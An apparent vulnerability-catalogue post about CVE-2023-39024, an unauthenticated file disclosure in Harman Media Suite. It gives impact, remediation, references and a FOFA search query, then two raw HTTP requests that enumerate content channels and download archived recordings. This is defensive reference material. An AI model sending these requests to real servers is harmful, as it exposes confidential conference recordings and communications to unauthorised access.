---
layout: post
cve_id: CVE-2023-39024
title: Harman Media Suite <= 4.2.0 - Local File Disclosure
pcap: true
pcap_path: /pcaps/2023/CVE-2023-39024.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-39024.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: high
impact: 'Unauthenticated attackers can download attachments and recordings stored
  within the Harman Media Suite application when anonymous access to the User Portal
  is enabled, potentially exposing confidential video conferences and internal communications.

  '
remediation: 'Update Harman Media Suite to a version newer than 4.2.0 that requires
  authentication for content channel archives access or disable anonymous access to
  the User Portal.

  '
reference:
- https://github.com/BenTheCyberOne/CVE-2023-39024-5-POC
- https://sploitus.com/exploit?id=C20FE0B5-806A-5687-850C-75D195576B35
- https://mediasuite.harman.com/channel-store
metadata:
  verified: true
  max-request: 2
  vendor: harman
  product: media-suite
  fofa-query: Harman Media Suite
tags:
- cve
- cve2023
- harman
- media-suite
- lfi
- vuln
---

## ðŸ” Vulnerability Description
Harman Media Suite (versions 4.2.0 and below) are vulnerable to possible Local File Disclosure. This allows an unauthenticated user to potentially download attachments and recordings stored within the Media Suite application if anonymous access to the User Portal is enabled.


## ðŸŒ HTTP Request
```nohighlight
GET /userportal/api/rest/contentChannels/?startIndex=0&pageSize=4&sort=TIME&showType=all HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/ Firefox/3.6.19
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /userportal/api/rest/contentChannels/s0Ol61/archives/?startIndex=0&pageSize=15&sort=time&onlyIncludeApproved=true HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

